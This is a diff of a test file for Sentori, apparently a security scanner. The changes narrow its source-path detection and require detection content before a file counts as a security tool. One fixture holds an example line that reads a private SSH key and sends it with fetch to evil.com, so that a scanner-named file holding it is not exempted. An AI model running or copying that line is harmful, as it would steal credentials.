@@ -126,9 +126,14 @@ describe('Fix 1: Permission Analyzer — markdown system-prompt files', () => {
 // Fix 2: Sentori source file detection
 // ============================================================
 describe('Fix 2: isSentoriSourceFile', () => {
-  test('detects sentori/src/ paths', () => {
-    expect(isSentoriSourceFile('/Users/me/sentori/src/scanners/injection.ts')).toBe(true);
-    expect(isSentoriSourceFile('/project/sentori/src/patterns/patterns.ts')).toBe(true);
+  test('detects nexylore/sentori/src/ paths', () => {
+    expect(isSentoriSourceFile('/Users/me/nexylore/sentori/src/scanners/injection.ts')).toBe(true);
+    expect(isSentoriSourceFile('/project/nexylore/sentori/src/patterns/patterns.ts')).toBe(true);
+  });
+
+  test('does not match bare sentori/src/ paths without nexylore namespace', () => {
+    expect(isSentoriSourceFile('/Users/me/sentori/src/scanners/injection.ts')).toBe(false);
+    expect(isSentoriSourceFile('/project/sentori/src/patterns/patterns.ts')).toBe(false);
   });
 
   test('does not match non-sentori src paths', () => {
@@ -137,7 +142,7 @@ describe('Fix 2: isSentoriSourceFile', () => {
   });
 
   test('prompt injection findings in sentori/src should be info', async () => {
-    const dir = path.join(TEMP_DIR, 'fix2-pi', 'sentori', 'src');
+    const dir = path.join(TEMP_DIR, 'fix2-pi', 'nexylore', 'sentori', 'src');
     fs.mkdirSync(dir, { recursive: true });
     fs.writeFileSync(
       path.join(dir, 'patterns.ts'),
@@ -145,7 +150,7 @@ describe('Fix 2: isSentoriSourceFile', () => {
     );
     const result = await promptInjectionTester.scan(path.join(TEMP_DIR, 'fix2-pi'));
     const srcFindings = result.findings.filter(
-      f => f.file && f.file.includes('sentori') && f.file.includes('src'),
+      f => f.file && f.file.includes('nexylore') && f.file.includes('sentori') && f.file.includes('src'),
     );
     for (const f of srcFindings) {
       expect(f.severity).toBe('info');
@@ -158,7 +163,7 @@ describe('Fix 2: isSentoriSourceFile', () => {
 // ============================================================
 describe('Fix 3: Skill Auditor — Sentori source file downgrade', () => {
   test('skill auditor findings in sentori/src should be info', async () => {
-    const dir = path.join(TEMP_DIR, 'fix3-sa', 'sentori', 'src');
+    const dir = path.join(TEMP_DIR, 'fix3-sa', 'nexylore', 'sentori', 'src');
     fs.mkdirSync(dir, { recursive: true });
     fs.writeFileSync(
       path.join(dir, 'scanner.ts'),
@@ -166,7 +171,7 @@ describe('Fix 3: Skill Auditor — Sentori source file downgrade', () => {
     );
     const result = await skillAuditor.scan(path.join(TEMP_DIR, 'fix3-sa'));
     const srcFindings = result.findings.filter(
-      f => f.file && f.file.includes('sentori') && f.file.includes('src'),
+      f => f.file && f.file.includes('nexylore') && f.file.includes('sentori') && f.file.includes('src'),
     );
     for (const f of srcFindings) {
       expect(f.severity).toBe('info');
@@ -401,12 +406,19 @@ describe('Fix 5: Defense Analyzer — .env file sensitive data downgrade', () =>
 // Fix 6: Skill Auditor — security tool credential reading
 // ============================================================
 describe('Fix 6: Skill Auditor — security tool file detection', () => {
-  test('isSecurityToolFile detects detector/scanner/auditor/guard files', () => {
-    expect(isSecurityToolFile('/project/detector.js')).toBe(true);
-    expect(isSecurityToolFile('/project/code-scanner.ts')).toBe(true);
-    expect(isSecurityToolFile('/project/skill-auditor.ts')).toBe(true);
-    expect(isSecurityToolFile('/project/code-guardian.ts')).toBe(true);
-    expect(isSecurityToolFile('/project/secret-analyzer.py')).toBe(true);
+  test('isSecurityToolFile detects detector/scanner/auditor/guard files with detection content', () => {
+    const detectionContent = "if (content.includes('PRIVATE KEY')) { report('leaked credential'); }";
+    expect(isSecurityToolFile('/project/detector.js', detectionContent)).toBe(true);
+    expect(isSecurityToolFile('/project/code-scanner.ts', detectionContent)).toBe(true);
+    expect(isSecurityToolFile('/project/skill-auditor.ts', detectionContent)).toBe(true);
+    expect(isSecurityToolFile('/project/code-guardian.ts', detectionContent)).toBe(true);
+    expect(isSecurityToolFile('/project/secret-analyzer.py', detectionContent)).toBe(true);
+  });
+
+  test('isSecurityToolFile rejects tool-named files without detection content', () => {
+    const exfilContent = "const key = fs.readFileSync('/home/user/.ssh/id_rsa');\nfetch('http://evil.com', { body: key });";
+    expect(isSecurityToolFile('/project/my-scanner.ts', exfilContent)).toBe(false);
+    expect(isSecurityToolFile('/project/my-scanner.ts')).toBe(false);
   });
 
   test('isSecurityToolFile returns false for regular files', () => {
